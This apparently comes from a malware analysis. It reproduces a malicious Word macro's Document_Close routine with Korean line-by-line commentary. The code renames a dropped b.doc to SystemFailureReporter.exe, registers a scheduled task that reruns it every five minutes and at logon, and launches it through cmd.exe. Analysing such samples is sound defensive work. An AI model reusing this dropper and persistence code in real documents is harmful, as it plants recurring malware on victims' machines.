`두번째 진입점

Private Sub Document_Close() `문서를 닫을때 시작되는 두번째 진입점
  Set ObjFSO = CreateObject("Scripting.FileSystemObject")       ` ObjFSO에 FileSystem 제어할 수 있는 객체 할당
  p = targetpath & bslash & subfolder & bslash                  ` 위에서 정의된 localappdata\SystemFailureReporter\ path지정
  a = p & "b.doc"                                               ` localappdata\SystemfaiureReporter\b.doc 반환 
  b = p & "SystemFailureReporter" & ".ex" & "e"                 ` localappdata\SystemFailureReporter\SystemFailureReporter.exe

  If objFSO.FileExists(a) And Not (objFSO.FileExists(b)) Then   ` a 즉 b.doc 파일이 있고 , SystemFailureReporter.exe 가 없다면 조건분기 실행
  Name a As b ` a의 이름을 b로 바꾼다
  End If ` 종료

  Result = CreateSchtask(subfolder, targetpath & bslash & subfolder, 5) `스케줄러에 등록 5분마다 대상 경로의 파일 실행


  ` -------------- CreateSchtask -------------

  Function CreateSchtask(ArtifactName As String, DirectoryPath As String, Frequency As Integer) `  함수생성 인자는 3개

    Dim service
    Set service = CreateObject("Schedule.Service")
    Call Service.Connect                                         ` 위의 Schedule.Service를 service 에 객체 할당 후 service Call

    Dim rootFolder
    Set rootFolder = service.GetFolder("\")                      ` 최상위 경로 \ 할당

    Dim taskDefinition
    Set taskDefinition = Service.NewTask(0)                      ` 스케줄러 작업지정

    Dim settings
    set settings = taskDefinition.triggers
    settings.StartWhenAvailable = True                           ` True 값 줌으로써 , 어떠한 사정으로 실행되지 못했을 경우 가능한 시점에 자동실행

    Const Trigger TypeRegistration = 7                           ` Trigger 타입지정 , 7은 작업 등록과 동시에 실행 [ 나머지 트리거 Microsoft 공식 문서 참조 ]
    Dim triggers
    Set triggers = taskDefinition.triggers                       ` Triggers 에  taskDefinition.triggers 부여 [ 트리거 추가 , 삭제 , 조회 등 ]

    Dim registrationTrigger
    Set registrationTrigger = triggers.Create(TriggerTypeRegistration) ` 등록 트리거 생성
    registrationTrigger.ID = ArtifactName & "RegistrationTrigger"      ` ArtifactName [ 매개변수로 받은 이름 ]  + RegistrationTrigger = 트리거 네임

    Dim repetitionPattern
    Set repetitionPattern = registrationTrigger.Repetition             ` registrationTrigger 반복 설정
    repetitionPattern.Interval = "PT" & Frequency & "M"                ` P - 기간의 시작 , T - 시간 부분의 시작 , M - 분을 의미  Frequency는 분을 위한 입력값 대기

    Const TriggerTypeLogon = 9                                         ` 로그온 시

    Dim loginTrigger
    Set logonTrigger = triggers.Create(TriggerTypeLogon)               ` 로그인 할 때 트리거 생성
    logonTrigger.ID = ArtifactName & "LogonTrigger"                    ` 위의 트리거 이름을 매개변수 입력받은값 + LogonTrigger 이라고 설정한다.
    logonTrigger.UserId = Environ("userdomain") & "\" & Environ("username") ` 도메인 또는 로컬 사용자 따라 - 이 코드를 실행한 사용자 또는 도메인

    Set repetitionPattern = logonTrigger.Repetition                    ` logonTrigger 반복지정
    repetitionPattern.Interval = "PT" & Frequency & "M"                ` 이전의 반복설정 , 입력값에 따른 반복설정

    Const ActionTypeExecutable = 0
    Dim action
    Set action = taskDefinition.Actions.Create(ActionTypeExecutable)                                 ` 실행할 수 있는 객체 부여
    action.path = DirectoryPath & "\" & ArtifactName & ".exe"                                        ` 실행path = Directory path + 매개변수.exe 지정
    Shell "cmd.exe /c %localappdata%\SystemFailureReporter\SystemFailureReporter.exe", vbNormalFocus ` cmd /c %appdata환경변수%\System~ 최종 cmd로 악성파일 실행

    Call rootFolder.RegisterTaskDefinition(ArtifactName, taskDefinition, 6, , , 3) ` 최상위에 스케줄 정의 , 매개변수이름으로 설정 , id,pw 생략 , 3= 로그인이후 작업
    
    
    
    
    
